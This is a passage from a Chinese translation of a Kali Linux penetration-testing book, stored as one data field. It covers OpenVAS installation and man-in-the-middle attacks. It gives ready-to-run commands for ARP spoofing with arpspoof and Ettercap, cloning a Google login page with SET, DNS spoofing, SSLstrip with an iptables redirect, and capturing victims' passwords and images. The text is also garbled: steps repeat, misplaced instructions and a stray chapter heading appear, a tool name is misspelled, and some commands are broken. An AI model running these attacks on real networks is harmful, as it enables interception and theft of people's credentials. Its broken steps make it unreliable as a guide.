  trans: "\n\n# 接下来做什么？\n\n在本章中，我们详细讨论了 `Nessus` 的各种用例。众所周知，单靠一个工具是不够进行自动扫描的。通常建议使用两个工具来扫描漏洞，因为某些主机可能会将著名的漏洞工具列入黑名单。在现实场景中，你可能有时需要创建自己的利用程序来攻击目标。但但目前，我们将帮助你使用另一个名为\
    \ `OpenVAS` 的工具进一步增强你的扫描目标。请继续阅读！\n\n# 第 20 章：介绍 OpenVAS\n\nOpenVAS 是一个开源的漏洞评估系统。也可以说它是一个包含相关工具的网络扫描器。它的核心组件是一个服务器，包含一组网络漏洞测试程序，可以检测远程系统和应用程序的安全问题。本节将介绍如何使用\
    \ OpenVAS 实现漏洞扫描。\n\n## 安装并初始化 OpenVAS 服务\n\n在 `Kali Linux 2019` 中，默认没有安装 `OpenVAS`\
    \ 服务。因此，如果你想使用 `OpenVAS` 服务进行漏洞扫描，需要先安装该服务。此外，当服务成功安装后，需要初始化 `OpenVAS` 库。下节将介绍安装\
    \ OpenVAS 服务和初始化 OpenVAS 库的方法。\n\n### 1) 安装 OpenVAS 服务\n\n由于默认未安装，你需要输入 Linux\
    \ 命令来启动服务，以便使用它进行漏洞扫描。\n执行命令如下：\n\n```bash\nroot@exampleserver:～# apt-get install\
    \ openvas -y\n```\n\n执行上述命令后，系统将检测依赖环境并下载相应的软件包。然后，它将在终端环境中自动安装所有下载的包。如果安装过程中没有报告错误，则说明\
    \ `OpenVAS` 服务安装成功。如果你遇到任何错误，请检查其在线文档以清除错误。\n\n### 2) 初始化 OpenVAS 库\n\n用户成功安装\
    \ `OpenVAS` 服务后，需要对其进行初始化。在此过程中，`OpenVAS` 将根据最新的可用性下载许多文件（插件和漏洞数据）。这个过程需要很长时间，用户需要耐心等待。我们建议在这一步使用高速网络连接。\n\
    \n执行命令如下：\n\n```bash\nroot@exampleserver:～# openvas-setup\n```\n\n从上面的输出信息中，你可以看到已经下载了大量文件且所有库都已更新。此外，最后顺序启动了\
    \ `OpenVAS` 相关服务，并自动生成了默认账户和密码。请记录下用户名和密码，以便在使用命令行界面尝试初始化时使用。密码通常是加密的。\n\n**提醒：**\
    \ 在 `Kali Linux 2019` 中，当所有 `OpenVAS` 服务成功启动后，浏览器会自动启动并显示 `OpenVAS` 的登录界面。\n\n\
    ### 3) 初始化密码\n\n当用户初始化 `OpenVAS` 服务时，系统默认会生成一个长字符串密码。这个密码既不容易输入也不记忆，显然不符合用户使用常用密码的习惯。因此，为了方便起见，你可以使用以下命令快速更改密码。\n\
    \n执行命令如下：\n\n```bash\nroot@exampleserver:～# openvasmd --user=admin --new-password=\"\
    this-is-my-new-password\"\n```\n\n执行上述命令后，不会显示任何输出。但并不意味着密码没有更改。请再次运行设置命令检查密码是否已更改。\n\
    \n**注意：** 如果再次运行 `openvas-setup` 命令，同步速度将非常快，并显著提高速度。\n\n### 4) 检查安装的完整性\n\n在某些情况下，使用\
    \ `apt-get` 安装总是会导致各种类型的错误。此时，用户可以使用 `openvas-check-setup` 命令来排查错误。该命令不仅会指出错误位置，还会提示解决方案。\n\
    \n执行命令如下：\n\n```bash\nroot@exampleserver:～# openvas-check-setup\n```\n\n从上述命令中，你需要了解软件将通过\
    \ 9 个步骤进行检查。检查完成后，如果你看到“success prompt”消息，则说明 `OpenVAS` 安装成功。\n\n### 5) 检查 OpenVAS\
    \ 服务状态\n\n当 `OpenVAS` 服务初始化后，你就可以访问该服务。为了确保访问 `OpenVAS` 服务没有问题，请在此检查其状态。用户可以使用\
    \ `netstat` 命令查看被监控的端口，并如下判断 `OpenVAS` 服务是否成功启动：\n\n```bash\nroot@exampleserver:～#\
    \ netstat\n```\n\n该命令显示 `OpenVAS` 服务已经启动。如果你没有看到与 `OpenVAS` 相关的监控程序结果，则说明服务未启动。\n\
    \n### 6) 设置外部访问\n\n通过检查 `OpenVAS` 服务的监控状态，我们可以看到服务的默认监控地址为 `127.0.0.1`，这意味着允许本地主机访问。为了方便使用，用户需要手动配置外部访问。在这里，你需要将\
    \ 3 个配置文件中的监听 IP 从 `127.0.0.1` 修改为 `0.0.0.0`（代表任何 IP）。然后重启 `OpenVAS` 服务。\n\n具体步骤如下：\n\
    \n1. 修改 `greenbone-security-assistant.service` 配置文件。在该文件中有两个地方需要修改。第一个是修改 `--listen`\
    \ 和 `--mlisten` 的监听地址。第二个是增加 host header 的主机地址。\n   首先，将监听地址设置为任何 IP (`0.0.0.0`)，如下：\n\
    \   ```bash\n   root@exampleserver:～# vi /usr/lib/systemd/system/greenbone-security-assistant\n\
    \   ```\n2. 增加 host header 的主机地址。如果不增加主机地址，外部访问时将出现以下错误信息：`The request contained\
    \ an unknown or invalid Host header`。如果你尝试通过主机名或代理访问 `GSA`，请确保 `GSA` 设置为允许。在 `--mlisten=0.0.0.0`\
    \ 之后添加 `--allow-header-host=IP 地址或域名`。其中，这台机器的 IP 地址为 `192.168.1.32`，即外部访问的 IP\
    \ 地址为 `192.168.1.32`，如下：\n   ```bash\n   ExecStart=/usr/sbin/gsad --foreground\
    \ --listen=0.0.0.0 --port=9392 --mlisten=0.0.0.0 --allow-header-host=192.168.1.32\
    \ --port=9392\n   ```\n3. 修改 `openvas-manager` 配置文件中的监听地址如下：\n   ```bash\n   root@exampleserver:～#\
    \ vi /etc/default/openvas-manager\n   MANAGER_ADDRESS=0.0.0.0\n   ```\n4. 修改 `greenbone-security-assistant`\
    \ 配置文件中的监控地址。该文件有两个地方需要修改，即 `GSA_ADDRESS` 和 `MANAGER_ADDRESS`，如下：\n   ```bash\n\
    \   root@exampleserver:～# vi /etc/default/greenbone-security-assistant\n   GSA_ADDRESS=0.0.0.0\n\
    \   ```\n5. 重启 `OpenVAS` 服务。执行命令如下：\n   ```bash\n   root@exampleserver:～# openvas-stop\n\
    \   root@exampleserver:～# openvas-start\n   ```\n   执行上述命令后，`OpenVAS` 服务成功重启。此时，再次检查监控状态：\n\
    \   ```bash\n   root@exampleserver:～# netstat -an\n   ```\n   如果你从输出中看到 `gsad`\
    \ 程序监控的地址为 `0.0.0.0`，那么此时外部主机就可以访问 `OpenVAS` 服务了。\n\n# 第 21 章：配置 OpenVAS\n\n在完成前面的系列配置后，用户可以登录\
    \ `OpenVAS` 服务。在用户成功登录 `OpenVAS` 服务后，需要进行一些简单的配置来执行漏洞扫描，例如创建新的扫描配置、目标和扫描任务。下节将介绍如何登录和配置\
    \ `OpenVAS` 服务。\n\n## 登录 OpenVAS 服务\n\n要登录 `OpenVAS` 服务，请仔细遵循以下步骤。如果遇到错误，请始终记住遵循故障排除指南。\n\
    \n1. 在浏览器中输入地址 `https://exampleserver:9392/`（IP 是服务器地址）。\n2. 界面显示浏览器不受信任连接。这是因为使用了\
    \ `HTTPS` 协议，必须点击“Advanced（高级）”并安全访问。\n3. 界面显示访问风险。如果确认访问没有问题，点击“Add Exception（添加异常）”按钮。\n\
    4. 界面显示添加异常的信息。点击“Confirm（确认）”按钮，将显示对话框。\n5. 在对话框中输入用户名和密码登录服务。这里的用户名是 `admin`，密码是\
    \ `this-is-my-new-password`。输入后点击“Login（登录）”按钮。\n6. 如果界面显示内容，则说明已成功登录 `OpenVAS`\
    \ 服务。\n\n**注意：** 重启系统后，如果想使用 `OpenVAS` 工具且启动服务出错，请使用 `openvas-setup` 命令重新同步数据库。\n\
    \n## 新建扫描配置\n\n扫描配置用于指定要扫描的目标。在执行扫描任务之前，必须先创建扫描配置和目标。`OpenVAS` 服务默认提供了一些扫描配置模板，如果提供的模板不满足需求，用户可以自己创建指定特定的插件族。\n\
    \n1. 在菜单栏中，选择 `Configuration|Scan Configs` 命令来打开扫描配置界面。\n2. 界面显示默认没有配置。点击`New\
    \ Scan Config（新建配置）`按钮打开对话框。\n3. 在对话框中设置配置名称，这里设置为 `initial`。选择`fast（快速）`单选，然后点击`Create（创建）`按钮。\n\
    4。 从此界面可以看到支持的漏洞插件族。如果想要选择特定类型的插件族，点击`Actions（操作）`列中的`Edit Configuration（编辑配置）`\
    \ 按钮。\n5. 如果不想使用某些插件，取消勾选`Selected`列中的复选框。设置完成后点击`Save（保存）`按钮，界面将显示。\n6. 从此界面可以看到扫描配置已成功创建，已选择了插件族。\n\
    \n## 新建扫描目标\n\n创建扫描配置后，需要创建目标以指定地址和扫描方法。\n\n1. 在菜单栏中，选择`Configuration|Targets`\
    \ 命令来打开目标界面。\n2. 界面显示默认没有目标。点击`New Target（新建目标）`按钮打开对话框。\n3. 在对话框中设置目标名称，这里设置为\
    \ `initial`。选择`Range（范围）`或`File（文件）`单选按钮，允许用户从头开始创建。点击`Create（创建）`按钮。\n4. 界面显示添加异常的信息。点击`Add\
    \ Exception（添加异常）`按钮，将显示对话框。\n5. 在对话框中输入用户名和密码登录服务。这里的用户名是 `admin`，密码是 `this-is-my-new-password`。输入后点击`Login（登录）`按钮。\n\
    6. 如果界面显示内容，说明目标已成功创建。\n\n## 新建扫描任务\n\n创建目标后，需要创建扫描任务来指定配置和目标。\n\n1. 在菜单栏中，选择`Scans|Tasks`\
    \ 命令来打开任务界面。\n2. 界面显示默认没有任务。点击`New Task（新建任务）`按钮打开对话框。\n3. 在对话框中设置任务名称，这里设置为 `initial`。从下拉菜单中选择配置和目标。然后点击`Create（创建）`按钮。\n\
    4. 创建任务后，界面将显示。\n5. 从`Policy`列可以看到支持的策略。如果想要选择特定类型的策略，在`Policy`列中点击`Actions（操作）`列中的`Edit\
    \ Task Policy（编辑任务策略）`按钮。\n6. 如果不想使用某些策略，取消勾选`Selected`列中的复选框。设置完成后点击`Save（保存）`。\n\
    7. 从此界面可以看到任务已成功创建。\n\n## 漏洞扫描\n\n通过前面的配置，`OpenVAS` 服务已配置完成。接下来可以启动漏洞扫描。以之前创建的任务为例来实现漏洞扫描：\n\
    \n1. 打开任务界面。\n2. 点击`Actions`标签下的`Start（开始）`按钮开始漏洞扫描。\n3. 从`Status`列可以看到扫描百分比。如果用户想要停止扫描，可以点击`Actions`列中的`Stop（停止）`按钮。扫描完成后，状态将从`New`变为`Done`。\n\
    4. 从`Status`列可以看到状态显示为`Done`，表示扫描完成。接下来你可以分析扫描结果获取目标主机的漏洞信息。\n\n**提醒：** 通常用户开始扫描后，会发现扫描速度非常慢且状态栏几乎不变。实际上，目标一直在扫描。由于这是浏览器显示的内容，用户需要手动刷新页面查看状态变化。用户也可以将其设置为每分钟自动刷新一次。`OpenVAS`的默认设置不是自动刷新，可以在下方修改为自动刷新。`OpenVAS`默认提供了\
    \ 4 种自动刷新时间。用户点击图中的下拉按钮，将展开可设置的自动刷新时间菜单。用户可以选择任何方法，以便随时查看扫描状态变化。\n\n用户扫描目标主机后，可以从扫描结果中获取漏洞信息。同样，为了方便用户分析扫描结果，OpenVAS\
    \ 还支持以不同的格式导出漏洞信息。下节将介绍分析和导出漏洞报告的方法。\n\n### 分析扫描结果\n\n对于系统管理员来说，分析并报告漏洞是非常重要的。通过有效的文档，开发团队很有可能尽快漏洞。\n\
    \n1. 打开扫描结果界面。\n2. 从`Severity`列可以看到目标主机存在严重漏洞，安全级别为`10.0`（高）。点击`Status`列按钮将显示漏洞扫描结果信息。\n\
    3. 从此界面可以看到所有已扫描漏洞的结果信息，包括漏洞名称（`Vulnerability`）、级别（`Severity`）、漏洞主机地址（`Host`）和相应的端口（`Location`）。其中，`10.0`是最严重的漏洞。`OpenVAS`服务支持多种过滤扫描结果的方法。用户可以通过点击`Report`前面的下拉按钮展开其他结果显示方法。\n\
    4. 从此界面显示的下拉菜单可以看到所有过滤方法，包括`Summary（摘要）`、`Results（结果）`、`Vulnerabilities（漏洞）`、`Hosts（主机）`、`Ports（端口）`、`Applications（应用程序）`、`Operating\
    \ Systems（操作系统）`、`CVEs（CVE）`、`SSL Certificates（SSL 证书）`和`Error Messages（错误消息）`。如果用户只想查看漏洞，点击`Report:Vulnerabilities`选项。\n\
    5. 从此界面可以看到所有漏洞，例如`SQL Server`的停止版本。因此，为了更安全，建议用户更新当前版本。\n\n### 导出漏洞报告\n\n用户扫描目标主机后，可以从扫描结果中获取主机的漏洞信息。同样，为了方便用户分析扫描结果，OpenVAS\
    \ 还支持以不同的格式导出漏洞信息。\n\n# 第 22 章：理解嗅探\n\n嗅探是网络管理员需要理解的一项技能。当数据包未加密时，黑客利用嗅探来窃取敏感信息（如密码）。这种攻击被称为“中间人攻击”。本章将帮助你理解嗅探以及中间人攻击的原理。\n\
    \n## 中间人攻击\n\n中间人攻击（MITM）是黑客使用的常用攻击方法，其中最典型的攻击方法是 ARP 欺骗和 DNS 欺骗。简单来说，中间人攻击是拦截两个通信双方之间的数据并进行篡改，而双方在不知情的情况下进行。\n\
    \n## 工作原理？\n\n当主机 A 和主机 B 通信时，如果主机 A 在 ARP 缓存中找不到主机 B 的 MAC 地址，会发送 ARP 广播到整个局域网。此时，主机\
    \ B 会响应：“我是主机 B，我的 MAC 地址是 XX-XX”。主机 A 会更新其缓存。当主机 A 再次与主机 B 通信时，数据包发送到路由器，路由器将其转发到主机\
    \ B。\n\n## 实现中间人攻击\n\n一旦你理解了中间人攻击的原理，就可以使用`arpoof`和`Ettercap`来实现中间人攻击。\n\n###\
    \ 1) 使用 arpoof 工具\n\n`arpoof`是一种基于 ARP 地址欺骗的网络嗅探工具，主要适用于交换型局域网。\n\n1. 开启路由转发。在攻击者主机上，执行命令如下：\n\
    ```bash\nroot@exampleserver:～# echo 1> /proc/sys/ipv4/ip_forward\n```\n看到上述输出意味着路由转发已开启。如果未开启，目标主机将无法访问网络。\n\
    \n2. 查看攻击主机的 IP 地址和 ARP 缓存。首先检查 IP 地址：\n```bash\nroot@exampleserver:～# ifconfig\n\
    ```\n从输出信息可以看到攻击主机 IP 地址为`192.168.29.134`，MAC 地址为`00:0c:29:79:95:e`。接着检查目标主机的\
    \ IP 地址和 ARP 缓存：\n```bash\nroot@exampleserver:～# ifconfig\n```\n从输出信息可以看到目标主机\
    \ IP 地址为`192.168.29.135`，MAC 地址为`00:0c:29:6c:5d:69`。然后：\n```bash\nroot@exampleserver:～#\
    \ arp\n```\n从输出中可以看到主机上有一个网关的 ARP 条目。通过查看地址条目可以确定攻击主机尚未与目标主机通信。此时，只要两个主机通信，它们就会请求对方的\
    \ IP 和 MAC 地址。此时，ARP 攻击就可以实现。\n\n`arpoof`的语法格式如下：\n```bash\narpoof [options] host\n\
    ```\n选项含义如下：\n- `-i`：指定使用的接口。\n- `-t`：指定目标。如果不指定，将欺骗局域网内的所有主机。\n- `-r`：实现双向欺骗。\n\
    - `Host`：指定要拦截的主机，通常是网关。\n\n使用`arpoof`工具的具体步骤如下：\n\n1. 开启路由转发。执行命令如下：\n```bash\n\
    root@exampleserver:～# echo 1> /proc/sys/ipv4/ip_forward\n```\n2. 查看攻击主机的 IP 地址和\
    \ ARP 缓存。首先检查 IP 地址：\n```bash\nroot@exampleserver:～# ifconfig\n```\n从输出信息可以看到攻击主机\
    \ IP 地址为`192.168.29.134`，MAC 地址为`00:0c:29:79:95:e`。检查目标主机的 IP 地址和 ARP 缓存：\n```bash\n\
    root@exampleserver:～# ifconfig\n```\n从输出信息可以看到目标主机 IP 地址为`192.168.29.135`，MAC\
    \ 地址为`00:0c:29:6c:5d:69`。然后：\n```bash\nroot@exampleserver:～# arp\n```\n3. 对目标主机实施\
    \ ARP 攻击。执行命令如下：\n```bash\nroot@exampleserver:～# arpoof -i eth0 -t\n```\n从输出信息可以看到攻击主机正在向目标主机发送\
    \ ARP 响应包，告诉目标主机网关的 MAC 地址为`00:0c:29:79:95:e`（攻击主机的 MAC 地址）。但真实的网关不同。这表明对目标主机的\
    \ ARP 欺骗已开始。\n\n4. 对网关实施 ARP 攻击。执行命令如下：\n```bash\nroot@exampleserver:～# arpoof\
    \ -i eth0 -t 192.168.29.135 -r\n```\n从输出信息可以看到攻击主机向目标主机和网关发送了 ARP 响应包，告诉网关和目标主机它们的\
    \ MAC 地址均为`00:0c:29:79:95:e`。\n\n**提醒：** 用户也可以通过一个命令同时对目标主机和网关实施 ARP 攻击。执行命令如下：\n\
    ```bash\nroot@exampleserver:～# arpoof -i eth0 -t 192.168.29.135 -r\n```\n\n5.\
    \ 检查目标主机的 ARP 缓存：\n```bash\nroot@exampleserver:～# arp\n```\n从输出信息中可以看到主机上有两个 ARP\
    \ 条目（网关和攻击主机的 ARP 条目）。从显示的 ARP 条目可以看到，网关和攻击主机的 MAC 地址是相同的。这表明目标主机已成功被 ARP 欺骗。\n\
    \n### 2) 使用 Ettercap 工具\n\nEttercap 是一种基于 ARP 地址欺骗的网络嗅探工具，主要适用于交换交换的局域网。下节将介绍如何使用`Ettercap`工具来实现中间人攻击。\n\
    \n1. 启动 Ettercap 工具。执行命令如下：\n```bash\nroot@exampleserver:～# ettercap -G\n```\n\
    执行上述命令后，将显示界面。这是`Ettercap`工具的图形界面。\n2. 嗅探包。在菜单栏中点击`Sniff|Unified sniffing`命令或按`Ctrl+U`快捷键。将显示对话框。\n\
    3. 选择网络接口。在对话框中选择`eth0`，然后点击“OK”按钮。\n4. 启动界面后，扫描所有主机。在菜单栏点击`Hosts|Scan`命令或按`Ctrl+S`快捷键。将显示界面。\n\
    5. 从输出信息可以看到扫描了 5 个主机。如果想要查看扫描主机列表，在菜单栏点击`Hosts|list`命令或按`Ctrl+H`快捷键。将显示界面。\n\
    6. 界面显示了 IP 地址和 MAC 地址。在此界面中选择一个主机作为目标（例如`192.168.29.2`），点击`Add to Target`按钮。\n\
    7. 启动嗅探后，在菜单栏点击`Start sniffing`命令或按`Shift+W`快捷键。这将开始 ARP 注入。\n8. 嗅探开始后，在对话框中选择攻击选项。\n\
    9. 界面显示攻击已成功。\n10. 停止嗅探，在菜单菜单中点击`Stop sniffing`命令。\n11. 停止攻击后，在菜单栏点击`Mitm|Stop`命令。\n\
    12. `Ettercap`提供了两种模式：图形界面和命令行。命令行模式的语法如下：\n```bash\nettercap -q -M arp:remote\
    \ -P dns_spoof /192.168.29.139//192.168.29.2\n```\n\n# 第 23 章：社会工程攻击\n\n社会工程攻击主要利用人的好奇心、贪婪和某些错误来攻击。Kali\
    \ Linux 提供了社会工程工具`SET`，可以用来实施社会工程攻击。\n\n 使用 使用 SET 实施社会攻击\n\n`SET`是一个 Python 驱动的社会工程渗透工具。\n\
    \n1. 启动社会工程工具。执行命令如下：\n```bash\nroot@exampleserver:～# setoolkit\n```\n执行上述命令后，输出：\n\
    `Do you agree to the terms of service [y/n]:`\n输入`y`将显示详细信息。\n2. 显示主菜单：\n```bash\n\
    #SET\n```\n根据需要选择相应的数字。例如，选择`1`（社会工程攻击）。\n3. 界面显示攻击类型。选择`2`（邮件钓鱼攻击）。\n4. 界面显示钓鱼攻击方法。选择`2`（网站克隆攻击）。\n\
    5. 界面显示设置克隆网站。选择`1`（克隆网站）。\n6. 界面提示输入克隆 URL：\n```\nEnter the URL to clone: \n\
    ```\n输入`http://www.google.com`。\n7. 界面显示设置 IP 地址：\n```\nEnter the IP address:\
    \ \n```\n输入`192.168.29.139`。\n8. 界面显示网站攻击选项：\n```\nSelect an attack \n```\n选择`1`（Spear-Phishing\
    \ 鱼叉钓鱼）：\n```\nset:webattack> 1\n```\n9. 将显示：\n```\n[192.168.29.139]: 192.168.29\n\
    ```\n此时指定 IP 地址以获取目标用户提交的信息，即攻击主机的 IP 地址。输入上述地址后，将显示：\n```\n1. Java Required\n\
    2. Google\n3. Twitter\n```\nset:webattack> Select a template:\n```\n2\n```\n显示了`SET`默认提供的几个模板。这里选择了\
    \ Google 模板。\n\n### 使用 Ettercap 启动 ARP 攻击\n\n1. 启动`dns_spoof`插件来实现 DNS 欺骗。执行命令如下：\n\
    ```bash\nroot@exampleserver:～# ettercap -q -M arp:remote -P dns_spoof /192.168.29.139//192.168.29.2\n\
    ```\n看到上述输出表示 DNS 欺骗已成功实施。目标主机访问任何网页时，都会被骗进攻击者创建的（`192.168.29.139`）伪页面，即克隆站点。\n\
    2. 假设目标用户将访问 Google。点击`http://www.google.com`，将显示页面。\n3. 可以看到访问的页面是登录 Google 服务器，但地址栏中的请求仍是`http://www.google.com/`。此时用户输入用户名和密码登录，这些信息将在攻击者处被捕获，显示如下：\n\
    ```\nHTTP: 42.62.98.167:80->USER: testuser PASS: password\n```\n从输出信息可以看到目标主机访问\
    \ UNIX 论坛的登录信息被监控。用户名是`testuser`，密码是`password`。\n\n# 第 24 章：捕获和监控数据\n\n成功实施中间人攻击后，可以捕获并监控目标主机的数据。本节将介绍如何捕获和分析数据。\n\
    \n## Wireshark，通用数据捕获工具\n\nWireshark 是一个专用的数据包捕获工具，用于捕获和分析数据。下节将介绍如何使用 Wireshark\
    \ 工具捕获数据。\n\n### 使用 Wireshark 监控数据包\n\n1. 实施中间人攻击。执行命令如下：\n```bash\nroot@exampleserver:～#\
    \ ettercap -q -M arp:remote /192.168.29.135//192.168.29.2\n```\n2. 启动 Wireshark\
    \ 工具。在菜单栏选择`Applications|sniffing/wireshark`命令并执行。将显示界面。\n3. 在监听接口处选择`eth0`，然后点击“OK”按钮。界面将显示。\n\
    4. 此时通过`eth0`监控的数据包将被捕获。如果用户想要停止捕获，可以点击`Actions`列中的`Stop`按钮。\n5. 保存捕获的包。在菜单栏选择`File\
    \ | Save`命令，指定文件名和位置。点击`Save`按钮成功保存。\n\n### 捕获图片\n\n`Driftnet`是一个简单且实用的图片捕获工具，可以轻松捕获网络包中的图片。下节将介绍如何使用`driftnet`工具捕获目标主机的图片。\n\
    \n1. 实施中间人攻击。执行命令如下：\n```bash\nroot@exampleserver:～# ettercap -M arp:remote /192.168.29.135//192.168.29.2\n\
    ```\n2. 使用`driftnet`监控目标主机的图片。执行命令如下：\n```bash\nroot@exampleserver:～# driftnet\
    \ -i eth0 -d /root/image\n```\n执行上述命令后，`driftnet`终端将弹出。当目标主机浏览网页时，捕获的图片将保存在`/root/image`目录下。\n\
    \n# 第 25 章：高级数据监控\n\n##监控 HTTP 数据\n\n`HTTP`（超文本传输协议）是一种用于 Web 服务器将文本传输到本地浏览器的协议。通常客户端使用`HTTP`访问网页。由于`HTTP`协议以明文传输数据，用户也可以通过中间人攻击监控目标用户访问的\
    \ HTTP 数据。下节将介绍使用`Ettercap`工具嗅探 HTTP 协议数据的方法。\n\n1. 实施中间人攻击。执行命令如下：\n```bash\n\
    root@exampleserver:～# ettercap -Tq -M arp:remote /192.168.29.135//192.168.29.2\n\
    ```\n看到上述输出表示对目标实施 ARP 欺骗已成功。\n2. 此时，当目标主机访问 HTTP 协议网站时，将在攻击主机处监控。例如，登录 UNIX 论坛，当用户输入用户名并登录时，将在攻击主机处被监控，显示如下：\n\
    ```\nHTTP: 42.62.98.167:80->USER: testuser PASS: password\n```\n从输出信息可以看到目标主机访问\
    \ UNIX 论坛的登录信息被监控。用户名是`testuser`，密码是`password`。\n\n###监控 HTTPS 数据\n\n`HTTPS`（基于套层的\
    \ HTTP 或安全超文本传输协议）是一个带安全的 HTTP 通道。对于某些安全网站，如 Facebook 和银行网站，HTTPS 协议在 HTTP 下增加了\
    \ SSL 层，因此是加密的。此时，用户可以使用 SSLstrip 工具解密 SSL 加密数据并获取 HTTPS 数据内容。\n\n1. 开启路由转发。执行命令如下：\n\
    ```bash\nroot@exampleserver:～# echo 1> /proc/sys/ipv4/ip_forward\n```\n2. 通过`iptables`将所有\
    \ HTTP 数据重定向到端口 10000。执行命令如下：\n```bash\nroot@exampleserver:～# iptables -t nat\
    \ -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000\n```\n\
    3. 使用`SSLstrip`监控端口 10000 以获取敏感信息。执行命令如下：\n```bash\nroot@exampleserver:～# sslstrip\
    \ -a -l 10000\n```\n执行上述命令后，SSLstrip 工具正在运行。此时会在当前目录创建一个名为`sslstrip.log`的文件。监控日志文件查看传输的数据，执行命令如下：\n\
    ```bash\nroot@exampleserver:～# tail -f sslstrip.log\n```\n**Tip：** 使用`SSLstrip`攻击时可能会出现某些警告信息，但并不影响数据的捕获。\n\
    4. 实施 ARP 欺骗。执行命令如下：\n```bash\nroot@exampleserver:～# ettercap -M arp:remote /192.168.29.135//192.168.29.2\n\
    ```\n5. 此时访问被加密的网站。如果目标用户提交敏感信息，会被 SSLstrip 捕获。例如，登录`mail.126.com`邮箱，将显示登录界面。\n\
    6. 当用户成功登录后，地址栏中将是解密后的 HTTP 协议，此时用户名和密码显示如下：\n```\n2019-04-15 15:18:51,945 POST\
    \ Data (password:126): server response: HTTP/1.1 200 OK\n```\n从上述输出可以看到目标主机访问了`mail.126.com`。此时，用户名是`testuser@126.com`，密码已加密。\n\
    \n## 快速分析数据\n\n当用户使用 Wireshark 捕获数据包时，可以使用`Xplico`工具快速分析数据。下节将介绍如何使用 Xplico 工具分析数据。\n\
    \n### 安装并启动 Xplico 服务\n\nKali Linux 默认没有安装`Xplico`工具。在使用工具之前，需要先安装它。执行命令如下：\n\
    ```bash\nroot@exampleserver:～# apt-get install xplico\n```\n执行上述命令后，如果没有报告错误，则安装成功。接下来需要启动服务。执行命令如下：\n\
    ```bash\nroot@exampleserver:～# service xplico start\n```\n检查监听端口以确定服务是否已成功启动：\n\
    ```bash\nroot@exampleserver:～# netstat -anpt | grep 9876\n```\n从输出中可以看到端口 9876\
    \ 正在监听，这说明 Xplico 服务已成功启动。具体步骤如下：\n\n1. 在浏览器中访问`http://IP:9876/`。\n2. 界面将显示 Xplico\
    \ 服务，默认用户名是`user`。\n3. 登录后，可以使用 Xplico 工具分析数据。\n\n# 第四四章：社会工程攻击\n\n社会工程攻击主要利用人的好奇心、贪婪和某些错误来攻击。Kali\
    \ Linux 提供了社会工程工具`SET`，可以用来实施社会工程攻击。\n\n# 章节：介绍 Metasploit\n\nMetasploit 是一个开源的安全漏洞检测工具。\n\
    \n## 什么是 Metasploit？\n\nMetasploit 是一个免费的可下载的框架。通过它，网络安全人员可以轻松获取、挖掘和攻击计算机软件漏洞。Metasploit\
    \ 框架可以用于发现漏洞、利用漏洞、提交漏洞以及执行攻击。此外，用户可以从其他漏洞扫描器导入数据，根据漏洞主机的详细信息发现可攻击的漏洞，并使用有效负载对系统发起攻击。Metasploit\
    \ 框架的威力在于它提供了大量的渗透测试模块和插件。这些模块可以根据用途分为 7 类，即`Exploits`（利用模块）、`Auxiliary`（辅助模块）、`Post`（后渗透攻击模块）、`Payloads`（有效负载模块）、`Encoders`（编码器模块）、`Nops`（空指令模块）和`Evasion`（规避模块）。\n\
    \n---\n\n**第 26 章：介绍 Metasploit**\n\nMetasploit 是一个开源的安全漏洞检测工具。它可以帮助网络安全和 IT 专业人员识别安全问题、验证漏洞解决方案，并完成对目标的安全评估。该工具涵盖了各种功能，如智能开发、代码审计、Web\
    \ 应用扫描和社交工程学。本节将介绍 Metasploit 的相关概念。\n\n"
